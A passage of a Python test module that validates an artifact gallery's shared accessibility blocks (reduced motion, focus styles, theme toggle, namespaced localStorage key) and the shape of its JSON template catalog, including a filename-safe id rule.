    """The string a storage-key expression resolves to *inside the region*.

    An identifier bound above the start marker resolves to nothing here, which
    is the containment failure rather than an inconvenience: the artifacts carry
    the region, not the file.
    """
    quoted = re.fullmatch(r"""['"](.*)['"]""", expression)
    if quoted:
        return quoted.group(1)
    if re.fullmatch(r"[A-Za-z_$][\w$]*", expression):
        binding = re.search(rf"""{_identifier_pattern(expression)}\s*=\s*['"](.*?)['"]""", region)
        if binding:
            return binding.group(1)
    return None


def check_i6(gallery_root: Path) -> list[str]:
    """I6 — the head region's storage key is namespaced to this gallery."""
    region, missing = _shared_region(gallery_root, HEAD_BLOCK, "the namespaced storage key")
    if region is None:
        return missing
    expressions = list(dict.fromkeys(found.strip() for found in _STORAGE_CALL_RE.findall(region)))
    if not expressions:
        return _failure(
            HEAD_BLOCK,
            "the marked region reads and writes no storage, so no namespaced key reaches any artifact",
        )
    failures: list[str] = []
    for expression in expressions:
        key = _key_literal(region, expression)
        if key is None:
            failures.extend(
                _failure(
                    HEAD_BLOCK,
                    f"the storage key '{expression}' resolves to no string literal inside the marked region, "
                    "so whatever it is bound to above the start marker reaches no artifact",
                )
            )
        elif GALLERY_NAMESPACE not in key:
            failures.extend(
                _failure(
                    HEAD_BLOCK,
                    f"the storage key '{key}' is not namespaced to this gallery ('{GALLERY_NAMESPACE}'), so "
                    "it collides in both directions with any other local document sharing the storage "
                    "partition",
                )
            )
    return failures


GROUP_I_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("I1", check_i1),
    ("I2", check_i2),
    ("I3", check_i3),
    ("I4", check_i4),
    ("I5", check_i5),
    ("I6", check_i6),
)


class SharedBlockAccessibilityTests(unittest.TestCase):
    """Group I against the shipped canonical blocks.

    Unlike group A's sweeps, nothing here is vacuous in ART-001: both canonical
    files ship in this feature, so every check reads a real region.
    """

    def test_group_i_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_I_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


# --- Group I fixtures ------------------------------------------------------

FIXTURE_SCHEME_RULES = (
    ':root[data-theme="dark"] {\n'
    "  color-scheme: dark;\n"
    "  --rc-surface: #1A1A1A;\n"
    "}\n"
    ':root[data-theme="light"] {\n'
    "  color-scheme: light;\n"
    "  --rc-surface: #F7F6F4;\n"
    "}"
)

FIXTURE_FOCUS_RULE = (
    "a:focus-visible,\nbutton:focus-visible {\n  outline: 2px solid var(--rc-link);\n  outline-offset: 2px;\n}"
)

FIXTURE_REDUCED_MOTION_RULE = (
    "@media (prefers-reduced-motion: reduce) {\n"
    "  *,\n"
    "  *::before {\n"
    "    transition-duration: 0.01ms !important;\n"
    "  }\n"
    "}"
)

# A brand kit that satisfies I1-I3, so each fixture below can break exactly one
# construct and leave the other two green.
FIXTURE_ACCESSIBLE_KIT = "\n\n".join(
    (
        ":root {\n  color-scheme: light dark;\n  --rc-link: #2A6A99;\n}",
        FIXTURE_SCHEME_RULES,
        FIXTURE_FOCUS_RULE,
        FIXTURE_REDUCED_MOTION_RULE,
    )
)

FIXTURE_STORAGE_KEY = "speckit-pro:artifact-gallery:theme"

# The read, and the closed-set validation of what it returns. Kept as its own
# constant so a fixture can lift it above the start marker verbatim.
FIXTURE_THEME_VALIDATION = (
    "  var stored = null;\n"
    "  try {\n"
    "    stored = window.localStorage.getItem(STORAGE_KEY);\n"
    "  } catch (unavailable) {\n"
    "    stored = null;\n"
    "  }\n"
    "  if (stored === DARK) {\n"
    "    active = DARK;\n"
    "  } else if (stored === LIGHT) {\n"
    "    active = LIGHT;\n"
    "  }\n"
)

FIXTURE_CONTROL_NAME = "    control.setAttribute('aria-label', 'Dark theme');\n"
FIXTURE_CONTROL_STATE = "    control.setAttribute('aria-pressed', active === DARK ? 'true' : 'false');\n"
FIXTURE_CONTROL_ELEMENT = "document.createElement('button')"

# A head block that satisfies I4-I6.
FIXTURE_ACCESSIBLE_HEAD = (
    "<meta http-equiv=\"Content-Security-Policy\" content=\"base-uri 'none'\">\n"
    "<script>\n"
    "(function () {\n"
    "  var LIGHT = 'light';\n"
    "  var DARK = 'dark';\n"
    f"  var STORAGE_KEY = '{FIXTURE_STORAGE_KEY}';\n"
    "  var active = LIGHT;\n"
    f"{FIXTURE_THEME_VALIDATION}"
    "  document.documentElement.setAttribute('data-theme', active);\n"
    "  document.addEventListener('DOMContentLoaded', function () {\n"
    f"    var control = {FIXTURE_CONTROL_ELEMENT};\n"
    f"{FIXTURE_CONTROL_NAME}"
    f"{FIXTURE_CONTROL_STATE}"
    "    control.addEventListener('click', function () {\n"
    "      window.localStorage.setItem(STORAGE_KEY, active);\n"
    "    });\n"
    "    document.body.appendChild(control);\n"
    "  });\n"
    "})();\n"
    "</script>"
)


def _without(body: str, construct: str) -> str:
    """The fixture body with one construct removed.

    A typo in ``construct`` leaves the body conforming, which surfaces as the
    rejection case failing rather than as a fixture that quietly proves nothing.
    """
    return body.replace(construct, "")


class SharedBlockAccessibilityFixtureTests(GalleryFixtureCase):
    """Group I against synthetic canonical files built in a temporary directory.

    Every check gets a case that places its construct **above** the start
    marker. That is the failure this group exists to catch and the one a
    presence check cannot see: the canonical file reads as correct, and the
    construct reaches none of the 21 artifacts.
    """

    def setUp(self) -> None:
        super().setUp()
        self.write_kit()
        self.write_head()

    # -- fixture builders --

    def write_kit(self, *, body: str = FIXTURE_ACCESSIBLE_KIT, above: str = "") -> None:
        self.write(CANONICAL_FILES[BRAND_BLOCK], above + _marked(BRAND_BLOCK, body) + "\n")

    def write_head(self, *, body: str = FIXTURE_ACCESSIBLE_HEAD, above: str = "") -> None:
        self.write(CANONICAL_FILES[HEAD_BLOCK], above + _marked(HEAD_BLOCK, body) + "\n")

    def assertKitReports(self, failures: list[str], *fragments: str) -> None:
        self.assertReports(failures, CANONICAL_FILES[BRAND_BLOCK], *fragments)

    def assertHeadReports(self, failures: list[str], *fragments: str) -> None:
        self.assertReports(failures, CANONICAL_FILES[HEAD_BLOCK], *fragments)

    # -- I1: reduced motion --

    def test_i1_accepts_the_at_rule_inside_the_region(self) -> None:
        self.assertEqual(check_i1(self.gallery), [])

    def test_i1_rejects_an_absent_at_rule(self) -> None:
        self.write_kit(body=_without(FIXTURE_ACCESSIBLE_KIT, FIXTURE_REDUCED_MOTION_RULE))

        self.assertKitReports(check_i1(self.gallery), "prefers-reduced-motion")

    def test_i1_rejects_the_at_rule_above_the_start_marker(self) -> None:
        self.write_kit(
            body=_without(FIXTURE_ACCESSIBLE_KIT, FIXTURE_REDUCED_MOTION_RULE),
            above=FIXTURE_REDUCED_MOTION_RULE + "\n",
        )

        self.assertKitReports(check_i1(self.gallery), "prefers-reduced-motion")

    def test_i1_rejects_an_at_rule_that_is_only_described_in_a_comment(self) -> None:
        """Commentary is not a construct — both regions carry prose of their own."""
        self.write_kit(
            body=_without(FIXTURE_ACCESSIBLE_KIT, FIXTURE_REDUCED_MOTION_RULE)
            + f"\n/* Handled elsewhere:\n{FIXTURE_REDUCED_MOTION_RULE} */"
        )

        self.assertKitReports(check_i1(self.gallery), "prefers-reduced-motion")

    # -- I2: focus treatment --

    def test_i2_accepts_a_focus_visible_rule_inside_the_region(self) -> None:
        self.assertEqual(check_i2(self.gallery), [])

    def test_i2_rejects_an_absent_focus_visible_rule(self) -> None:
        self.write_kit(body=_without(FIXTURE_ACCESSIBLE_KIT, FIXTURE_FOCUS_RULE))

        self.assertKitReports(check_i2(self.gallery), ":focus-visible")

    def test_i2_rejects_a_focus_visible_rule_above_the_start_marker(self) -> None:
        self.write_kit(
            body=_without(FIXTURE_ACCESSIBLE_KIT, FIXTURE_FOCUS_RULE),
            above=FIXTURE_FOCUS_RULE + "\n",
        )

        self.assertKitReports(check_i2(self.gallery), ":focus-visible")

    # -- I3: the forced colour scheme --

    def test_i3_accepts_color_scheme_under_both_forced_themes(self) -> None:
        self.assertEqual(check_i3(self.gallery), [])

    def test_i3_rejects_a_forced_theme_that_sets_no_color_scheme(self) -> None:
        self.write_kit(body=_without(FIXTURE_ACCESSIBLE_KIT, "  color-scheme: light;\n"))

        self.assertKitReports(check_i3(self.gallery), 'data-theme="light"', "color-scheme")

    def test_i3_rejects_a_forced_theme_left_following_the_operating_system(self) -> None:
        """``light dark`` under a forced theme resolves against the OS, not the override."""
        self.write_kit(
            body=FIXTURE_ACCESSIBLE_KIT.replace("  color-scheme: dark;\n", "  color-scheme: light dark;\n")
        )

        self.assertKitReports(check_i3(self.gallery), 'data-theme="dark"', "color-scheme")

    def test_i3_rejects_a_forced_theme_rule_above_the_start_marker(self) -> None:
        light_rule = ':root[data-theme="light"] {\n  color-scheme: light;\n  --rc-surface: #F7F6F4;\n}'
        self.write_kit(body=_without(FIXTURE_ACCESSIBLE_KIT, light_rule), above=light_rule + "\n")

        self.assertKitReports(check_i3(self.gallery), 'data-theme="light"', "color-scheme")

    # -- I4: the theme control --

    def test_i4_accepts_a_named_stateful_control_built_in_the_region(self) -> None:
        self.assertEqual(check_i4(self.gallery), [])

    def test_i4_rejects_a_region_that_builds_no_button(self) -> None:
        self.write_head(
            body=FIXTURE_ACCESSIBLE_HEAD.replace(FIXTURE_CONTROL_ELEMENT, "document.createElement('div')")
        )

        self.assertHeadReports(check_i4(self.gallery), "button")

    def test_i4_rejects_a_control_with_no_accessible_name(self) -> None:
        self.write_head(body=_without(FIXTURE_ACCESSIBLE_HEAD, FIXTURE_CONTROL_NAME))

        self.assertHeadReports(check_i4(self.gallery), "accessible name")

    def test_i4_rejects_a_control_with_no_state_attribute(self) -> None:
        self.write_head(body=_without(FIXTURE_ACCESSIBLE_HEAD, FIXTURE_CONTROL_STATE))

        self.assertHeadReports(check_i4(self.gallery), "state attribute")

    def test_i4_rejects_a_control_built_above_the_start_marker(self) -> None:
        control = (
            "<script>\n"
            f"var control = {FIXTURE_CONTROL_ELEMENT};\n"
            f"{FIXTURE_CONTROL_NAME}{FIXTURE_CONTROL_STATE}"
            "</script>\n"
        )
        self.write_head(
            body=_without(
                _without(_without(FIXTURE_ACCESSIBLE_HEAD, FIXTURE_CONTROL_NAME), FIXTURE_CONTROL_STATE),
                FIXTURE_CONTROL_ELEMENT,
            ),
            above=control,
        )

        self.assertHeadReports(check_i4(self.gallery), "button")

    # -- I5: the stored override --

    def test_i5_accepts_a_validated_override_applied_as_a_literal(self) -> None:
        self.assertEqual(check_i5(self.gallery), [])

    def test_i5_rejects_an_override_applied_with_no_closed_set_check(self) -> None:
        self.write_head(
            body=FIXTURE_ACCESSIBLE_HEAD.replace(
                FIXTURE_THEME_VALIDATION,
                "  var stored = window.localStorage.getItem(STORAGE_KEY);\n  active = stored;\n",
            )
        )

        self.assertHeadReports(check_i5(self.gallery), "dark")

    def test_i5_rejects_writing_the_string_read_back_out_of_storage(self) -> None:
        self.write_head(
            body=FIXTURE_ACCESSIBLE_HEAD.replace(
                "setAttribute('data-theme', active)",
                "setAttribute('data-theme', window.localStorage.getItem(STORAGE_KEY))",
            )
        )

        self.assertHeadReports(check_i5(self.gallery), "data-theme")

    def test_i5_rejects_a_validation_above_the_start_marker(self) -> None:
        self.write_head(
            body=FIXTURE_ACCESSIBLE_HEAD.replace(
                FIXTURE_THEME_VALIDATION,
                "  var stored = window.localStorage.getItem(STORAGE_KEY);\n",
            ),
            above=f"<script>\n{FIXTURE_THEME_VALIDATION}</script>\n",
        )

        self.assertHeadReports(check_i5(self.gallery), "dark")

    # -- I6: the storage key --

    def test_i6_accepts_a_gallery_namespaced_key(self) -> None:
        self.assertEqual(check_i6(self.gallery), [])

    def test_i6_rejects_an_unnamespaced_key(self) -> None:
        self.write_head(body=FIXTURE_ACCESSIBLE_HEAD.replace(f"'{FIXTURE_STORAGE_KEY}'", "'theme'"))

        self.assertHeadReports(check_i6(self.gallery), "theme")

    def test_i6_rejects_a_region_that_touches_no_storage(self) -> None:
        self.write_head(
            body=FIXTURE_ACCESSIBLE_HEAD.replace("window.localStorage.getItem(STORAGE_KEY)", "null").replace(
                "window.localStorage.setItem(STORAGE_KEY, active);", ""
            )
        )

        self.assertHeadReports(check_i6(self.gallery), "storage")

    def test_i6_rejects_a_key_bound_above_the_start_marker(self) -> None:
        binding = f"  var STORAGE_KEY = '{FIXTURE_STORAGE_KEY}';\n"
        self.write_head(
            body=_without(FIXTURE_ACCESSIBLE_HEAD, binding),
            above=f"<script>\n{binding}</script>\n",
        )

        self.assertHeadReports(check_i6(self.gallery), "STORAGE_KEY")


# ---------------------------------------------------------------------------
# Group B — catalog shape (FR-007, FR-019; SC-003)
# ---------------------------------------------------------------------------

SCHEMA_VERSION = "1.0"
CATALOG_KEYS = ("schema_version", "signals", "export_kinds", "templates")

# The nine documented keys, in FR-007's declaration order. Only the *set* is
# asserted: JSON object key order carries no meaning to any consumer, so a rule
# about ordering would be one no check ever applies.
ENTRY_KEYS = (
    "id",
    "category",
    "title",
    "when_to_use",
    "stage",
    "trigger",
    "source",
    "status",
    "exports",
)

# The closed export vocabulary, declared as data in the catalog for the same
# reason the signal vocabulary is: a consumer reads the declaration rather than
# a list embedded in a checker. `prompt` carries a reader's conclusion to a
# coding agent; `markdown` carries it to a pull-request comment or a file.
EXPORT_KINDS = ("prompt", "markdown")

SEEDED_ENTRY_COUNT = 21
STAGES = ("draft-pr", "final-pr", "ad-hoc")
CATEGORIES = (
    "exploration-planning",
    "code-review",
    "design",
    "prototyping",
    "diagrams",
    "decks",
    "research",
    "reports",
    "editors",
)
PLANNED = "planned"
SHIPPED = "shipped"
STATUSES = (PLANNED, SHIPPED)
UPSTREAM = "upstream"
REPOSITORY = "repository"
ORIGINS = (UPSTREAM, REPOSITORY)

# B12's pin. **Held here, not read back out of the catalog** — a set read from
# the file it validates proves nothing. This is the one check that sees a later
# spec renaming an identifier: renaming the derived artifact alongside it leaves
# the catalog and the artifact directory agreeing with each other, so every
# existence and orphan check stays green and only a set fixed outside both
# notices the seed changed.
SEEDED_IDS: tuple[str, ...] = (
    "implementation-plan",
    "spec-explainer",
    "code-approaches",
    "module-map",
    "pr-writeup",
    "annotated-diff",
    "flowchart",
    "uat-walkthrough",
    "visual-designs",
    "design-system",
    "component-variants",
    "animation-prototype",
    "interaction-prototype",
    "svg-illustrations",
    "slide-deck",
    "concept-explainer",
    "status-report",
    "incident-report",
    "triage-board",
    "feature-flags",
    "prompt-tuner",
)

# Filename-safe kebab-case: lowercase alphanumerics in hyphen-separated
# segments. Everything FR-019 bans falls out of it — a path separator, a ``..``
# segment, a dot, whitespace, and a leading, trailing, or repeated hyphen all
# fail to match, which is what keeps ``templates/<id>.html`` inside the
# artifact directory.
_KEBAB_RE = re.compile(r"[a-z0-9]+(?:-[a-z0-9]+)*")


def _catalog(gallery_root: Path) -> tuple[dict | None, list[str]]:
    """The parsed catalog, or the failure **B1 owns**.

    Every other check in groups B, C, and D defers to B1 here rather than
    reporting the same missing or unreadable file again: one defect, one
    message. Absence is still never a pass — B1 always reports it.
    """
    path = gallery_root / MANIFEST_FILE
    if not path.is_file():
        return None, [
            f"{MANIFEST_FILE}: the catalog is missing, so no entry, signal, or artifact correspondence "
            "can be checked"
        ]
    try:
        parsed = json.loads(_read_exact(path))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        return None, [f"{MANIFEST_FILE}: the catalog is unreadable, so nothing in it can be checked: {error}"]
    if not isinstance(parsed, dict):
        return None, [
            f"{MANIFEST_FILE}: the catalog's top level is a {type(parsed).__name__} rather than an object, "
            f"so it carries none of the keys {list(CATALOG_KEYS)}"
        ]
    return parsed, []


def _loaded(gallery_root: Path) -> dict | None:
    catalog, failures = _catalog(gallery_root)
    return None if failures else catalog


def _entries(gallery_root: Path) -> list | None:
    """The ``templates`` array, or ``None`` when B1 or B3 already owns the defect."""
    catalog = _loaded(gallery_root)
    if catalog is None:
        return None
    entries = catalog.get("templates")
    return entries if isinstance(entries, list) else None


def _catalog_failure(where: str, message: str) -> str:
    return f"{MANIFEST_FILE}: {where}: {message}"


def _usable_id(entry: object) -> str | None:
    """The identifier an entry can safely be *named by*, or ``None``.

    ``None`` for an id that is missing, not a string, or malformed — the cases
    where naming the entry by its identifier is circular.
    """
    if not isinstance(entry, dict):
        return None
    identifier = entry.get("id")
    if not isinstance(identifier, str) or not _KEBAB_RE.fullmatch(identifier):
        return None
    return identifier


def _designations(entries: list) -> list[str]:
    """How each entry is named in a failure message.

    By ``id`` — **except** where the id is missing, duplicated, or malformed,
    which are named by array position, since naming by identifier is circular
    exactly where the identifier is what went wrong.
    """
    identifiers = [_usable_id(entry) for entry in entries]
    counts: dict[str, int] = {}
    for identifier in identifiers:
        if identifier is not None:
            counts[identifier] = counts.get(identifier, 0) + 1
    return [
        f"entry '{identifier}'" if identifier is not None and counts[identifier] == 1 else f"templates[{index}]"
        for index, identifier in enumerate(identifiers)
    ]


def check_b1(gallery_root: Path) -> list[str]:
    """B1 — the top level carries exactly the three documented keys."""
    catalog, failures = _catalog(gallery_root)
    if catalog is None:
        return failures
    present = set(catalog)
    return [
        _catalog_failure("top level", f"key '{key}': missing")
        for key in CATALOG_KEYS
        if key not in present
    ] + [
        _catalog_failure(
            "top level",
            f"key '{key}': unexpected — the catalog carries exactly {list(CATALOG_KEYS)}",
        )
        for key in sorted(present.difference(CATALOG_KEYS))
    ]


def check_b2(gallery_root: Path) -> list[str]:
    """B2 — the declared schema version has not drifted."""
    catalog = _loaded(gallery_root)
    if catalog is None or "schema_version" not in catalog:
        return []  # B1 owns an absent catalog and an absent key
    version = catalog["schema_version"]
    if version != SCHEMA_VERSION:
        return [
            _catalog_failure(
                "top level",
                f"key 'schema_version': expected '{SCHEMA_VERSION}', found {version!r}",
            )
        ]
    return []


def check_b3(gallery_root: Path) -> list[str]:
    """B3 — the catalog is seeded with all 21 entries."""
    catalog = _loaded(gallery_root)
    if catalog is None or "templates" not in catalog:
        return []
    entries = catalog["templates"]
    if not isinstance(entries, list):
        return [
            _catalog_failure(
                "top level",
                f"key 'templates': expected an array of {SEEDED_ENTRY_COUNT} entries, "
                f"found {type(entries).__name__}",
            )
        ]
    if len(entries) != SEEDED_ENTRY_COUNT:
        return [
            _catalog_failure(
                "top level",
                f"key 'templates': expected {SEEDED_ENTRY_COUNT} entries, found {len(entries)}",
            )
        ]
    return []


def check_b4(gallery_root: Path) -> list[str]:
    """B4 — each entry carries exactly the nine documented keys."""
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    failures: list[str] = []
    for index, entry in enumerate(entries):
        where = designations[index]
        if not isinstance(entry, dict):
            failures.append(
                _catalog_failure(
                    where,
                    f"expected an object carrying the nine documented keys, found {type(entry).__name__}",
                )
            )
            continue
        present = set(entry)
        failures.extend(
            _catalog_failure(where, f"key '{key}': missing") for key in ENTRY_KEYS if key not in present
        )
        failures.extend(
            _catalog_failure(
                where,
                f"key '{key}': unexpected — an entry carries exactly the nine documented keys and no "
                "stored path, since the artifact resolves as 'templates/<id>.html'",
            )
            for key in sorted(present.difference(ENTRY_KEYS))
        )
    return failures


def _enum_failures(gallery_root: Path, field: str, allowed: tuple[str, ...]) -> list[str]:
    """Membership of one closed field, over every entry that carries it."""
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    failures: list[str] = []
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict) or field not in entry:
            continue  # B4 owns a non-object entry and a missing key
        value = entry[field]
        if not isinstance(value, str) or value not in allowed:
            failures.append(
                _catalog_failure(
                    designations[index],
                    f"field '{field}': {value!r} is not one of {list(allowed)}",
                )
            )
    return failures


def check_b5(gallery_root: Path) -> list[str]:
    """B5 — ``stage`` is one of the three-member set."""
    return _enum_failures(gallery_root, "stage", STAGES)


def check_b6(gallery_root: Path) -> list[str]:
    """B6 — ``category`` is one of the nine-member enum."""
    return _enum_failures(gallery_root, "category", CATEGORIES)


def check_b7(gallery_root: Path) -> list[str]:
    """B7 — ``status`` is one of the two-member set."""
    return _enum_failures(gallery_root, "status", STATUSES)


def check_b8(gallery_root: Path) -> list[str]:
    """B8 — ``title`` and ``when_to_use`` are non-empty strings.

    Whitespace-only counts as empty: a title of three spaces names the document
    no better than an absent one, and passing it would make the check a type
    assertion rather than a content one.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    failures: list[str] = []
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict):
            continue
        for field in ("title", "when_to_use"):
            if field not in entry:
                continue  # B4 owns the missing key
            value = entry[field]
            if not isinstance(value, str) or not value.strip():
                failures.append(
                    _catalog_failure(
                        designations[index],
                        f"field '{field}': expected a non-empty string, found {value!r}",
                    )
                )
    return failures


def _id_defect(identifier: str) -> str:
    if any(token in identifier for token in ("/", "\\", ".")):
        return (
            "carries a path separator or a dot, so composing 'templates/<id>.html' would resolve outside "
            "the artifact directory or name something the derivation never can"
        )
    if any(character.isspace() for character in identifier):
        return "carries whitespace, which is not filename-safe"
    return (
        "is not filename-safe kebab-case (lowercase alphanumerics in hyphen-separated segments, with no "
        "leading, trailing, or repeated hyphen)"
    )


def check_b9(gallery_root: Path) -> list[str]:
    """B9 — every ``id`` is unique and filename-safe kebab-case.

    Entries are named by **position** throughout: this is the check whose whole
    subject is the identifier, so naming an entry by the value under suspicion
    would be circular. Every offender is reported, not just the first.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []
    failures: list[str] = []
    positions: dict[str, list[int]] = {}
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict) or "id" not in entry:
            continue  # B4 owns a non-object entry and a missing id
        identifier = entry["id"]
        if not isinstance(identifier, str):
            failures.append(
                _catalog_failure(
                    f"templates[{index}]",
                    f"field 'id': expected a string, found {identifier!r}",
                )
            )
            continue
        positions.setdefault(identifier, []).append(index)
        if not _KEBAB_RE.fullmatch(identifier):
            failures.append(
                _catalog_failure(
                    f"templates[{index}]",
                    f"field 'id': '{identifier}' {_id_defect(identifier)}",
                )
            )
    for identifier, found in positions.items():
        if len(found) > 1:
            failures.extend(
                _catalog_failure(
                    f"templates[{index}]",
                    f"field 'id': '{identifier}' is also used by "
                    f"{', '.join(f'templates[{other}]' for other in found if other != index)}, "
                    "so two entries derive one artifact path",
                )
                for index in found
            )
    return failures


def check_b10(gallery_root: Path) -> list[str]:
    """B10 — ``source`` matches one of its two forms exactly.

    An unrecognized ``origin`` fails **here**, at the shape layer, rather than
    falling through to the attribution checks: a discriminator matching neither
    branch would otherwise ship an artifact with no attribution checked at all.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    failures: list[str] = []
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict) or "source" not in entry:
            continue  # B4 owns a non-object entry and a missing key
        where = designations[index]
        source = entry["source"]
        if not isinstance(source, dict):
            failures.append(
                _catalog_failure(
                    where,
                    f"field 'source': expected an object, found {type(source).__name__}",
                )
            )
            continue
        origin = source.get("origin")
        if not isinstance(origin, str) or origin not in ORIGINS:
            failures.append(
                _catalog_failure(
                    where,
                    f"field 'source': key 'origin': {origin!r} is not one of {list(ORIGINS)}, so neither "
                    "attribution branch would run",
                )
            )
            continue
        expected = ("origin", "file") if origin == UPSTREAM else ("origin",)
        present = set(source)
        for key in expected:
            if key not in present:
                failures.append(
                    _catalog_failure(
                        where,
                        f"field 'source': key '{key}': missing from the '{origin}' form, which carries "
                        f"exactly {list(expected)}",
                    )
                )
        for key in sorted(present.difference(expected)):
            failures.append(
                _catalog_failure(
                    where,
                    f"field 'source': key '{key}': unexpected in the '{origin}' form, which carries "
                    f"exactly {list(expected)}",
                )
            )
        if origin == UPSTREAM and "file" in present:
            upstream_file = source["file"]
            if not isinstance(upstream_file, str) or not upstream_file.strip():
                failures.append(
                    _catalog_failure(
                        where,
                        f"field 'source': key 'file': expected a non-empty string, found {upstream_file!r}",
                    )
                )
    return failures


def check_b11(gallery_root: Path) -> list[str]:
    """B11 — ``source.file`` is unique across the catalog.

    Two entries naming one upstream file would give two artifacts the same
    asserted provenance, which FR-020's per-artifact attribution cannot express.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    positions: dict[str, list[int]] = {}
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict):
            continue
        source = entry.get("source")
        if not isinstance(source, dict):
            continue  # B10 owns a malformed source
        upstream_file = source.get("file")
        if isinstance(upstream_file, str) and upstream_file.strip():
            positions.setdefault(upstream_file, []).append(index)
    failures: list[str] = []
    for upstream_file, found in positions.items():
        if len(found) > 1:
            failures.extend(
                _catalog_failure(
                    designations[index],
                    f"field 'source': key 'file': '{upstream_file}' is also claimed by "
                    f"{', '.join(designations[other] for other in found if other != index)}",
                )
                for index in found
            )
    return failures


def check_b12(gallery_root: Path) -> list[str]:
    """B12 — the catalog's identifier set equals the seeded set pinned above.

    The pin is a literal in this file rather than a set read back out of the
    catalog, which is the entire point: a set derived from the file under
    validation asserts only that the file equals itself. This is what catches a
    later spec renaming an identifier and its derived artifact together — the
    rename leaves the catalog and the artifact directory consistent, so groups
    B9, D1, and D3 all stay green.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []
    present = {entry["id"] for entry in entries if isinstance(entry, dict) and isinstance(entry.get("id"), str)}
    return [
        _catalog_failure(
            "top level",
            f"key 'templates': seeded identifier '{identifier}' is absent from the catalog — an identifier "
            "is fixed by the seed and changes only by recorded amendment",
        )
        for identifier in SEEDED_IDS
        if identifier not in present
    ] + [
        _catalog_failure(
            "top level",
            f"key 'templates': identifier '{identifier}' is not in the seeded set — an identifier is fixed "
            "by the seed and changes only by recorded amendment",
        )
        for identifier in sorted(present.difference(SEEDED_IDS))
    ]


def check_b13(gallery_root: Path) -> list[str]:
    """B13 — every entry's ``exports`` is an array drawn from the declared vocabulary.

    The value is a list, its members are strings, each member is declared in the
    catalog's own ``export_kinds``, and no member repeats. An empty list is
    valid and is how an entry states that its reader produces nothing durable —
    that assertion has to be sayable, or every read-only artifact looks like a
    forgotten one.

    Membership is checked against the catalog's declaration rather than the
    module constant, for the same reason the signal checks are: a consumer reads
    the declaration, so the declaration is what has to be right.
    """
    catalog, failures = _catalog(gallery_root)
    if catalog is None:
        return failures
    declared = catalog.get("export_kinds")
    if not isinstance(declared, list):
        return []  # B1 owns the shape of the declaration itself.
    allowed = {kind for kind in declared if isinstance(kind, str)}
    problems: list[str] = []
    for index, entry in enumerate(catalog.get("templates") or []):
        if not isinstance(entry, dict):
            continue
        where = _usable_id(entry) or f"templates[{index}]"
        value = entry.get("exports")
        if not isinstance(value, list):
            problems.append(
                _catalog_failure(
                    f"entry '{where}'",
                    "key 'exports': must be an array of declared export kinds — an absent or non-array "
                    "value leaves it unsaid whether the artifact is read-only or simply unfinished",
                )
            )
            continue
        seen: set[str] = set()
        for member in value:
            if not isinstance(member, str):
                problems.append(
                    _catalog_failure(
                        f"entry '{where}'",
                        f"key 'exports': member {member!r} is not a string",
                    )
                )
                continue
            if member not in allowed:
                problems.append(
                    _catalog_failure(
                        f"entry '{where}'",
                        f"key 'exports': '{member}' is not declared in 'export_kinds' — the vocabulary is "
                        "closed, and a kind no consumer can resolve is worse than none",
                    )
                )
            if member in seen:
                problems.append(
                    _catalog_failure(
                        f"entry '{where}'",
                        f"key 'exports': '{member}' repeats — a kind is carried once or not at all",
                    )
                )
            seen.add(member)
    return problems


def check_b14(gallery_root: Path) -> list[str]:
    """B14 — the export vocabulary closes in both directions.

    Every kind declared is carried by at least one entry, and every kind carried
    is declared. The same property the signal vocabulary holds, enforced the
    same way and for the same reason: a declared-but-unused kind is dead
    vocabulary a later author will guess at, and a used-but-undeclared kind is a
    value no consumer can resolve.

    B13 already rejects an undeclared member per entry. This states the
    catalog-wide half — the direction B13 structurally cannot see, because it
    reads one entry at a time.
    """
    catalog, failures = _catalog(gallery_root)
    if catalog is None:
        return failures
    declared_raw = catalog.get("export_kinds")
    if not isinstance(declared_raw, list):
        return []
    declared = {kind for kind in declared_raw if isinstance(kind, str)}
    carried: set[str] = set()
    for entry in catalog.get("templates") or []:
        if not isinstance(entry, dict):
            continue
        members = entry.get("exports")
        # A str is iterable, so an `exports` written as "prompt" rather than
        # ["prompt"] would otherwise be walked character by character and
        # reported as five undeclared kinds. B13 owns that shape; skip it here
        # rather than emit noise about a defect another check already names.
        if not isinstance(members, list):
            continue
        for member in members:
            if isinstance(member, str):
                carried.add(member)
    return [
        _catalog_failure(
            "top level",
            f"key 'export_kinds': '{kind}' is declared but no entry carries it — an unused kind is "
            "vocabulary a later author has to guess the meaning of",
        )
        for kind in sorted(declared.difference(carried))
    ] + [
        _catalog_failure(
            "top level",
            f"key 'export_kinds': '{kind}' is carried by an entry but is not declared — the vocabulary "
            "is the declaration, not the union of what entries happen to use",
        )
        for kind in sorted(carried.difference(declared))
    ]


GROUP_B_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("B1", check_b1),
    ("B2", check_b2),
    ("B3", check_b3),
    ("B4", check_b4),
    ("B5", check_b5),
    ("B6", check_b6),
    ("B7", check_b7),
    ("B8", check_b8),
    ("B9", check_b9),
    ("B10", check_b10),
    ("B11", check_b11),
    ("B12", check_b12),
    ("B13", check_b13),
    ("B14", check_b14),
)


class CatalogShapeTests(unittest.TestCase):
    """Group B against the shipped catalog."""

    def test_group_b_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_B_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group B fixtures — catalog shape (FR-007, FR-019; SC-003)
# ---------------------------------------------------------------------------

# The five names the fixtures route on. They are deliberately **synthetic**:
# FR-017 forbids this file holding a copy of the real vocabulary, and a fixture
# is still this file. C1 asserts the count, so a fixture vocabulary has to be
